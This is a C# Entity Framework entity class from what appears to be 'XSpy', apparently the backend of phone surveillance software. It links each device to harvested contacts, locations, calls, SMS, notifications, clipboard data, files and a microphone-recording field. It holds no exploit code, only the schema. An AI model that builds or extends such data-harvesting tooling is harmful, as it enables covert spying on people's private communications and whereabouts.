using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.ComponentModel.DataAnnotations.Schema;
using Microsoft.EntityFrameworkCore.Infrastructure;
using XSpy.Database.Entities.Base;

namespace XSpy.Database.Entities.Devices
{
    [Table("devices")]
    public class Device : LazyLoaded
    {
        public Device(ILazyLoader lazyLoader) : base(lazyLoader)
        {
        }

        public Device()
        {
        }

        private User _userData;
        private ICollection<Contact> _contacts;
        private ICollection<Location> _locations;
        private ICollection<Call> _calls;
        private ICollection<InstalledApps> _apps;
        private ICollection<File> _savedFiles;
        private ICollection<FileList> _imageList;
        private ICollection<Sms> _messages;
        private ICollection<Notification> _notifications;
        private ICollection<Permission> _permissions;
        private ICollection<TempPath> _tempPaths;
        private ICollection<Clipboard> _clipboards;
        [Key, Column("id")] public Guid Id { get; set; }

        [Column("user_id"), ForeignKey(nameof(UserData))]
        public Guid UserId { get; set; }

        [Column("device_id"), MaxLength(50)] public string DeviceId { get; set; }
        [Column("model"), MaxLength(40)] public string Model { get; set; }

        [Column("manufacturer"), MaxLength(40)]
        public string Manufacturer { get; set; }

        [Column("sys_version"), MaxLength(30)] public string SystemVersion { get; set; }
        [Column("last_ip"), MaxLength(45)] public string LastIp { get; set; }
        [Column("is_online")] public bool IsOnline { get; set; }
        [Column("is_loading_dir")] public bool IsLoadingDir { get; set; }
        [Column("recording_mic_block")] public DateTime? RecordingMicBlock { get; set; }

        [Column("added_at")] public DateTime AddedAt { get; set; }
        [Column("updated_at")] public DateTime UpdatedAt { get; set; }

        public User UserData
        {
            get => LazyLoader.Load(this, ref _userData);
            set => _userData = value;
        }


        public ICollection<Contact> Contacts
        {
            get => LazyLoader.Load(this, ref _contacts);
            set => _contacts = value;
        }


        public ICollection<Location> Locations
        {
            get => LazyLoader.Load(this, ref _locations);
            set => _locations = value;
        }

        public ICollection<Call> Calls
        {
            get => LazyLoader.Load(this, ref _calls);
            set => _calls = value;
        }

        public ICollection<InstalledApps> Apps
        {
            get => LazyLoader.Load(this, ref _apps);
            set => _apps = value;
        }

        public ICollection<File> SavedFiles
        {
            get => LazyLoader.Load(this, ref _savedFiles);
            set => _savedFiles = value;
        }


        public ICollection<FileList> ImageList
        {
            get => LazyLoader.Load(this, ref _imageList);
            set => _imageList = value;
        }

        public ICollection<Sms> Messages
        {
            get => LazyLoader.Load(this, ref _messages);
            set => _messages = value;
        }
        public ICollection<Notification> Notifications
        {
            get => LazyLoader.Load(this, ref _notifications);
            set => _notifications = value;
        }

        public ICollection<Permission> Permissions
        {
            get => LazyLoader.Load(this, ref _permissions);
            set => _permissions = value;
        }
        
        public ICollection<TempPath> TempPaths
        {
            get => LazyLoader.Load(this, ref _tempPaths);
            set => _tempPaths = value;
        }
        public ICollection<Clipboard> Clipboards
        {
            get => LazyLoader.Load(this, ref _clipboards);
            set => _clipboards = value;
        }
    }
}